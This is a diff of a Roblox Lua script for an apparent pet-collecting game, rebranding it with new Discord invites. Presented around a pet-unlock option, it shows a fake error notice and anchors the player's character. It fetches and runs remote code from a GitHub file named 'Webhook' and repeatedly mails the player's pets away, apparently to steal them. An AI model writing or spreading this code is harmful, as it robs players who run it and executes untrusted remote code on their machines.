@@ -13,6 +13,15 @@ local PetFolders = {
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
 };
+if time() <= 30 then
+	wait(0);
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "Script error",
+		Text = "Please wait and try again Remote not found !",
+		Icon = "rbxassetid://57254792",
+		Duration = 15
+	});
+	return;
 end;
 local Loading = Instance.new("ScreenGui");
 local MainFrame = Instance.new("Frame");
@@ -54,7 +63,7 @@ Title.BackgroundTransparency = 0;
 Title.Position = UDim2.new(0, 0, 0, 0);
 Title.Size = UDim2.new(0, 0, 0, 0);
 Title.Font = Enum.Font.FredokaOne;
-Title.Text = "Monz Scriptz On Top";
+Title.Text = "Hostee Scriptz On Top | .gg/hosteehub";
 Title.TextColor3 = Color3.fromRGB(255, 255, 255);
 Title.TextScaled = true;
 Title.TextSize = 0;
@@ -233,9 +242,9 @@ if _G.AntiLeave == true then
 end;
 wait(0);
 Client.Character.HumanoidRootPart.Anchored = true;
-(loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Monz")))();
-writefile("Monz Better.txt", "https://discord.gg/dvCgjJVFVu");
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Monz Better", "All");
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20Webhook%20%E2%9C%97")))();
+writefile("HosteeOnTop.txt", "discord.gg/rizzhub");
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|SimoNHuB On Top!!!|", "All");
 if _G.UnlockPets == true then
 	local function unlockPetsInFolder(folder)
 		local children = folder:GetChildren();
@@ -283,7 +292,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -295,7 +304,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -307,7 +316,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -319,7 +328,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -331,7 +340,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
